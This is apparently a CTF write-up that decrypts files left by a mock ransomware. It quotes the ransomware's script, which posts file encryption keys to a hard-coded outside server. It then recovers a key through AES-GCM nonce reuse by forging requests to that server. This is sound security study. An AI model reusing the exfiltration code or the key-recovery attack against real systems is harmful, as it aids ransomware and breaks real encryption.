# Crowdstrike Adversary Quest 2022 / Catapult Spider / #3 So Much Bits

## Challenge Description

Unfortunately, after infection, the ransomware managed to encrypt all the customer's important files. Thanks to your help, we were able to determine the infection path and delete the control panel as well as the running ransomware. This also enabled us to gain access to the files on the disk of an infected Linux host. You can find the restored files attached. They are still encrypted, though, but at least the ransomware left some files. Please figure out whether there is a chance to decrypt the files without paying the ransom.

## Challenge Files

```console
$ ls -laR       
.:
total 5
drwxr-xr-x 1 501 dialout  192 Jul 31 10:48 .
drwxr-xr-x 1 501 dialout  288 Jul 31 10:44 ..
-rw-r--r-- 1 501 dialout  191 Jul 18 19:37 keys.db
drwxr-xr-x 1 501 dialout  128 Jul 31 10:48 notes
-rw-r--r-- 1 501 dialout  785 Jul 18 19:37 such_note_much_ransom.txt
-rwxr-xr-x 1 501 dialout 1084 Jul 31 10:46 victim_script.py

./notes:
total 2
drwxr-xr-x 1 501 dialout 128 Jul 31 10:48 .
drwxr-xr-x 1 501 dialout 192 Jul 31 10:48 ..
-rw-r--r-- 1 501 dialout 100 Jul 18 19:37 grocery.txt.enc
-rw-r--r-- 1 501 dialout 165 Jul 18 19:37 todo.txt.enc
```

### File *such_note_much_ransom.txt*

A ransomnote written in doge speech.

- Contact mail address is `AllYourDogeAreBelongToDoge@protonmail.com`.
- Dogecoin wallet `DJR6L7PeDcen9GFzoJnPioRd1tV3wt9X3p`.

### File *keys.db*

Seems to be binary, structure yet unknown.

```console
$ xxd keys.db                                                                  
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: e752 8b60 7533 30a0 ba74 e24e 4d2c ef86  .R.`u30..t.NM,..
00000020: 8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42  .Zv..[[....._..B
00000030: 0000 0000 2200 0000 2f68 6f6d 652f 6368  ....".../home/ch
00000040: 616c 6c65 6e67 652f 6e6f 7465 732f 746f  allenge/notes/to
00000050: 646f 2e74 7874 2e65 6e63 0000 0000 2c00  do.txt.enc....,.
00000060: 0000 6365 7279 2e74 7874 2e65 6e63 b02f  ..cery.txt.enc./
00000070: d231 39e8 386d 2dd9 78dd a744 226c 46a9  .19.8m-.x..D"lF.
00000080: 97c6 4fa0 a269 fe23 d38d 9bb4 e602 0000  ..O..i.#........
00000090: 0000 2500 0000 2f68 6f6d 652f 6368 616c  ..%.../home/chal
000000a0: 6c65 6e67 652f 6e6f 7465 732f 6772 6f63  lenge/notes/groc
000000b0: 6572 792e 7478 742e 656e 6300 0000 00    ery.txt.enc....
```

### File *notes/grocery.txt.enc*

Likely one of the restored encrypted files.

```console
$ xxd grocery.txt.enc 
00000000: cc2d a24c fa37 2d8b 2006 27f5 c46a 7f6c  .-.L.7-. .'..j.l
00000010: b6bb edc9 4082 7ff3 6120 6478 03dd f66b  ....@...a dx...k
[...]
```

### File *notes/todo.txt.enc*

And another restored but still encrypted file.

```console
$ xxd todo.txt.enc   
00000000: cc2d a24c fa37 2d8b 2006 27f5 4700 d5eb  .-.L.7-. .'.G...
00000010: d878 4fc6 fbd9 5eae 4fd3 e0c6 117d 3092  .xO...^.O....}0.
[...]
```

What directly gets our attention is that the first 12 bytes (`cc2d a24c fa37 2d8b 2006 27f5`) are the same in both encrypted files.

Could be a re-use of crypto material, but that's still speculation at this point in time.

### File *victim_script.py*

This is likely the script that was used to trigger the encryption the above files.

## Analysis of the Encryption Script

Let's start with taking a look at function `main()`.

### Function *main()*

```python
[...]
from encrypter import *
[...]
def main():
    paths = generate_path_list()
    # Encrypt data with military-grade AES-GCM
    encrypted_data = encrypt_files(paths)
    # Delete encryption module to anger security researchers
    os.remove("encrypter.py")
    write_files(encrypted_data)
    key_db = get_encrypted_key_db(encrypted_data)
    write_key_db(key_db)
```

We don't know the functionality that is imported from the (actor) module `encrypter`, as it was deleted (*angry face*). Since there are no other references we can recognize, we assume that the functions `generate_path_list()`, `encrypt_files()` and `write_files()` were imported from `encrypter`.

- `generate_path_list()` sounds like it may return a list of file path strings to encrypt.
- `encrypt_files()` is - according to the comment - applying *military-grade* AES-GCM to encrypt the data.
  - Whatever data structure is returned from it, it is assigned to `encrypted_data` which is used as an argument for function `write_files()`.
- `write_files()` will likely write the encrypted data to disk.

Afterwards two functions are called that are defined in the supplied script: `get_encrypted_key_db()` and `write_key_db()`.

### Function *write_key_db()*

No magic here. This is likely the culprit to generate the supplied file `keys.db`. It will write whatever is passed to the function as an argument, which in turn is the result of function `get_encrypted_key_db()`.

```python
def write_key_db(data):
    with open("keys.db", "wb") as h:
        h.write(data)
```

### Function *get_encrypted_key_db()*

Let's inspect the code here.

```python
def get_encrypted_key_db(data):
    encoded_data = bytearray()
    for _, key, path in data:
        encoded_data += len(key).to_bytes(4, byteorder='little')
        encoded_data += key
        encoded_data += b"\x00\x00\x00\x00"
        encoded_data += len(path).to_bytes(4, byteorder='little')
        encoded_data += f"{path}".encode()
        encoded_data += b"\x00\x00\x00\x00"
    res = requests.post("http://116.202.161.100:57689/encrypt_db", data=b64encode(encoded_data))
    return b64decode(res.text)
```

This is actually the only function/code part that we can seriously work on. This is the generator function for the contents of file `keys.db`. Maybe we can spot a weakness in the logic in order to retrieve (parts of) the crypto material needed for decryption.

The function iterates over list entries of the variable `data`, which is the function's first and only argument. `main()` passed `encrypted_data` to it.

Each list entry (of `encrypted_data`) seems to be composed of three parts: `_, key, path`.

For each list entry, a data structure is appended to `encoded_data`.

| Offset | Length | Value | Comment |
| --- | --- | --- | --- |
| 0 | 4 | unknown | Length of *key*, Byte order: Little endian |
| 4 | unknown | unknown | Key length, likely values for AES-GCM would be 16, 24 or 32 Byte |
| unknown | 4 | "\x00" * 4 | Static value, some sort of padding or delimiter |
| unknown | 4 | unknown | Length of file path, Little endian |
| unknown | unknown | unknown | File path string |
| unknown | 4 | "\x00" * 4 | Static value, some sort of padding or delimiter |

Then an HTTP POST request is made to `http://116.202.161.100:57689/encrypt_db` with the base64 encoded value of `encoded_data`.

The result is base64 decoded, return to `main()` and then written to our `keys.db`.

## Finding out more about the Server Encryption API

Let's recap what we figured out this far.

- `encrypt_files()` returns a list of lists with entries like `(unknown, key, path)`.
- `get_encrypted_key_db()` iterates over this list.
- For each entry, a data structure is filled with information about the key and file path (see table above) and appended to `encoded_data`.
- `encoded_data` is base64 encoded and sent to `http://116.202.161.100:57689/encrypt_db`.
- The result is base64 decoded and written to file `keys_db`.

Since we do not know the key length used or anything else, why don't we begin with forging queries to the web service endpoint `/encrypt_db`?

### Empty Request

Let's be curious and send an empty query.

```console
$ curl -X POST http://116.202.161.100:57689/encrypt_db    
Could not encrypt keys: Error during encryption -- Nonce cannot be empty
```

The server error message reads, that it was unable to encrypt (the supplied) keys. It also adds the reason: The _Nonce_ was empty.

This is very interesting! It seems like any part of the submitted data is going to be used as a nonce. That's usually part of a cryptographic algorithm, which usually should never be used more than once - hence the name nonce (*number used once*).

### Theorize on AES-GCM and Nonce Re-Use

If we remember the source code comment about [AES-GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode) being used, we can [google around for possible attacks on it with nonce-reuse](https://www.elttam.com/blog/key-recovery-attacks-on-gcm/#content).

```txt
[...]
Even a single AES-GCM nonce reuse can be catastrophic.
A single nonce reuse leaks the xor of plaintexts, so if one plaintext is known the adversary can completely decrypt the other.
[...]
```

Awesome, how would it work for us?

The first block of plaintext (16 bytes) will be XOR encrypted by `E(k)` (keystream), which is derived from the server (file) key encryption key and the nonce. So we get `E(K) ^ plaintext(file encryption key) = ciphertext(file encryption key)`.

If we were able to let the server encrypt a 16 byte null key with the same nonce, we get `E(K) ^ plaintext(null key) = ciphertext(null key)`.

Thus we could recover `plaintext(file encryption key)` the following way:

- `E(k) = E(k)`
- `plaintext(file encryption key) ^ ciphertext(file encryption key) = plaintext(null key) ^ ciphertext(null key)`
- `plaintext(file encryption key) = ciphertext(null key) ^ ciphertext(file encryption key)`

That's totally awesome. But we still do not know what exactly is used as the nonce value nor do we know the correct key length yet.

### Pivoting on Nonce and Key Length

Let's forge more queries to the server key encryption API by re-using function `get_encrypted_key_db()` with the script [query_encrypt_db.py](./query_encrypt_db.py).

```python
# Set null key based on sys.argv[1] 16/24/32 Bytes (128/192/256 Bit)
# Set file path to sys.argv[2]
# File path /home/challenge/notes/todo.txt.enc (found in keys.db)
key_len = int(sys.argv[1])
file_path = sys.argv[2]
key_db = get_encrypted_key_db([["unknown", b"\x00" * key_len, file_path]])
print(hexlify(key_db).decode())
```

Start with a 16 byte null key and a file path string that we know from the challenge files.

```console
$ ./query_encrypt_db.py 16 /home/challenge/notes/todo.txt.enc | xxd -r -p | xxd 
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: a7b2 6309 7bcf c456 b07d 81a6 4358 f383  ..c.{..V.}..CX..
00000020: 2b98 3d92 e0c0 49a4 63dd 70c7 f07b 69c0  +.=...I.c.p..{i.
00000030: 0000 0000 2200 0000 2f68 6f6d 652f 6368  ....".../home/ch
00000040: 616c 6c65 6e67 652f 6e6f 7465 732f 746f  allenge/notes/to
00000050: 646f 2e74 7874 2e65 6e63 0000 0000       do.txt.enc....
```

Okay, this already looks **very** similar to how the entry in the challenge file `keys.db` looked like. Comparison:

```console
$ xxd -l 0x5e keys.db
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: e752 8b60 7533 30a0 ba74 e24e 4d2c ef86  .R.`u30..t.NM,..
00000020: 8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42  .Zv..[[....._..B
00000030: 0000 0000 2200 0000 2f68 6f6d 652f 6368  ....".../home/ch
00000040: 616c 6c65 6e67 652f 6e6f 7465 732f 746f  allenge/notes/to
00000050: 646f 2e74 7874 2e65 6e63 0000 0000       do.txt.enc....
```

The only differences are in bytes 0x10 to 0x2f (32 bytes). If we test with longer key lengths (192 Bit, 256 Bit), we are returned higher values at the beginning (0x34, 0x3C).

If we are to play around with different path strings, we get the *nonce empty* error if and only if the path length is zero. For the path string `a` and 16 null bytes key, we get this result back:

```console
$ ./query_encrypt_db.py 16 a | xxd -r -p | xxd 
00000000: 2100 0000 6117 9551 beed 30eb 0442 b325  !...a..Q..0..B.%
00000010: e969 94f1 95fa 0dc4 ca50 5bbc 2a22 cb15  .i.......P[.*"..
00000020: 0a88 05f0 6000 0000 0001 0000 0061 0000  ....`........a..
00000030: 0000 
```

If we send a 16 byte null key and a longer path name, like `todo.txt.enc12345`, we get this blob back.

```console
$ ./query_encrypt_db.py 16 /home/challenge/notes/todo.txt.enc12345 | xxd -r -p | xxd 
00000000: 2c00 0000 7478 742e 656e 6331 3233 3435  ,...txt.enc12345
00000010: db70 9b44 79f6 eff1 b857 7814 26a1 4584  .p.Dy....Wx.&.E.
00000020: 2a9d c5da 64e0 9abe c784 82bf d0a9 6bae  *...d.........k.
00000030: 0000 0000 2700 0000 2f68 6f6d 652f 6368  ....'.../home/ch
00000040: 616c 6c65 6e67 652f 6e6f 7465 732f 746f  allenge/notes/to
00000050: 646f 2e74 7874 2e65 6e63 3132 3334 3500  do.txt.enc12345.
00000060: 0000 00
```

Observations and recap:

- The first 4 bytes seem to be a length value for the following blob part, followed by a padding of 4 null bytes, followed by a 4 byte length value for the following full path string, followed by a 4 null byte padding.
- The first length value seems to be calculated by the formula `0x10 + len(key) + max(len(path), 12)`.
- The file path string, up to the last 12 bytes, seems to be used as a crypto nonce. Which makes sense, as nonce values for AES-GCM are usually 12 bytes long.
- The source code comment mentions *military-grade AES-GCM*, which uses a nonce and a tag (for decryption).
- The ransomnote also mentions that it will be impossible to recover files if they would be renamed or deleted.
  - For AES-GCM decryption of the encrypted file, we might need the file encryption key, nonce and tag.
  - The same is true for the decryption of the file encryption keys.

## Approach

Based on what we know so far, we can assume that:

- The AES-GCM file encryption key is encrypted by AES-GCM server-side.
- The file encryption key length is 16 bytes (one AES block), thus we expect the encrypted file encryption key to be 16 bytes long as well.
- The last 12 bytes of the path string are used as the nonce for the file key encryption (or less, if path is smaller).
- The server API returns a 0x2c sized blob (for key lengths of 16 bytes)
  - The first 12 bytes are the nonce value.
  - The following 32 bytes will likely contain both
    - The 16 bytes long encrypted file encryption key and
    - The 16 bytes long AES-GCM tag.

We do not know the order yet, in which the encrypted key bytes and the tag bytes are delivered. It could be (nonce, key, tag) or (nonce, tag, key).

Let's take a look again at the key blobs that we generated for the null key and path `/home/challenge/notes/todo.txt.enc` and the corresponding blob from the local `keys.db`.

```txt
Generated, null key
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: a7b2 6309 7bcf c456 b07d 81a6 4358 f383  ..c.{..V.}..CX..
00000020: 2b98 3d92 e0c0 49a4 63dd 70c7 f07b 69c0  +.=...I.c.p..{i.
[...]
```

```txt
Local file keys.db
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: e752 8b60 7533 30a0 ba74 e24e 4d2c ef86  .R.`u30..t.NM,..
00000020: 8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42  .Zv..[[....._..B
```

### Option Nonce, Key, Tag

- Length: `2c00 0000` (4 bytes, value 44)
- Nonce: `746f 646f 2e74 7874 2e65 6e63` (12 bytes)
- Encrypted Key: `e752 8b60 7533 30a0 ba74 e24e 4d2c ef86` (16 bytes)
- Tag: `8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42` (16 bytes)

With ...

- `plaintext(file encryption key) = ciphertext(null key) ^ ciphertext(file encryption key)`

... we get

- `plaintext(file encryption key) = a7b263097bcfc456b07d81a64358f383 ^ e7528b60753330a0ba74e24e4d2cef86`
- `plaintext(file encryption key) = 40e0e8690efcf4f60a0963e80e741c05`

### Option Nonce, Tag, Key

- Length: `2c00 0000` (4 bytes, value 44)
- Nonce: `746f 646f 2e74 7874 2e65 6e63` (12 bytes)
- Tag: `e752 8b60 7533 30a0 ba74 e24e 4d2c ef86` (16 bytes)
- Encrypted Key: `8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42` (16 bytes)

- `plaintext(file encryption key) = 2b983d92e0c049a463dd70c7f07b69c0 ^ 8f5a76011d5b5bd5f7ddc6f25fdb1b42`
- `plaintext(file encryption key) = a4c24b93fd9b12719400b635afa07282`

### Verify the Options

Now we need to verify this by using above key with given file path string and compare the server answer with the local entry in `keys.db` ([see script verify_option.py](./verify_option.py)).

```console
$ ./verify_option.py 
[*] Successfully verified option 2
[=] Recovered file encryption key a4c24b93fd9b12719400b635afa07282
```

We have successfully verified the blob structure option 2 (nonce, tag, key)!

Now that we think of it, it could makes sense to have the AES-GCM metadata (nonce, tag) in front of the encrypted data. But some online sources would have made us expect option 1 with the tag bytes appended to the ciphertext (see for example [section 5.1 of RFC 5116](https://www.rfc-editor.org/rfc/rfc5116)).

## Now it's Flag Time!

Now that we know how to recover the plaintext file encryption keys, we can try to decrypt the files.

Since we're assuming again that AES-GCM-128 was used, we need to find the nonce and tag of the encrypted file. We expect them to be prepended to the encrypted contents just like above.

```python
# Decrypt todo.txt.enc
with open("./notes/todo.txt.enc", "rb") as g:
  todo = g.read()
g.close()

file_nonce = todo[0:12]
file_tag = todo[12:28]
file_content = todo[28:]

cipher = AES.new(file_encryption_key, AES.MODE_GCM, file_nonce)
decrypted_file_content = cipher.decrypt_and_verify(file_content, file_tag)
print(decrypted_file_content.decode())
```

See [full script decrypt_todo.py](./decrypt_todo.py).

```console
$ ./decrypt_todo.py                                                                  1 ⨯
ToDos
=====
* Dump firmware
  * Decrypt firmware?
* Finish that exploit finally
* Doge!
* Push CS{d0g3_s0_n1c3_such_4m4z3} to scoreboard
```

Flag: **CS{d0g3_s0_n1c3_such_4m4z3}**
